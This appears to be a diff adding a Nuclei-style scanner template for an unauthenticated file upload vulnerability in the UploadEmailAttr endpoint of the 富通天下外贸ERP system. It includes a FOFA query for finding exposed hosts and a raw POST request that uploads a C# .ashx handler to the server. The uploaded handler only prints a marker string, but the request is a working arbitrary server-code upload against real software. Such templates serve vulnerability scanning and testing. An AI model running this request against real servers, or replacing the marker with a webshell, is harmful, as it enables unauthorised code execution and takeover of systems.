@@ -1,0 +1,40 @@
+id: futong-uploademailattr-file-upload
+
+info:
+  name: "富通天下外贸ERP UploadEmailAttr 接口文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="用户登录_富通天下外贸ERP"
+          富通天下外贸ERP系统在UploadEmailAttr接口实现中存在文件上传验证机制缺失问题。攻击者可利用该缺陷上传恶意文件（如Webshell或恶意脚本），从而实现对目标系统的未授权访问或数据篡改。该漏洞可能造成服务器控制权丧失、敏感数据泄露及业务中断等风险。
+  reference:
+  - XVE-2024-8865
+  tags: 富通天下外贸ERP
+
+http:
+- raw:
+  - |
+    POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    <% @ webhandler language="C#" class="AverageHandler" %>
+    using System;
+    using System.Web;
+    public class AverageHandler : IHttpHandler
+    {
+    public bool IsReusable
+    { get { return true; } }
+    public void ProcessRequest(HttpContext ctx)
+    {
+    ctx.Response.Write("NdayTest");
+    }
+    }
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
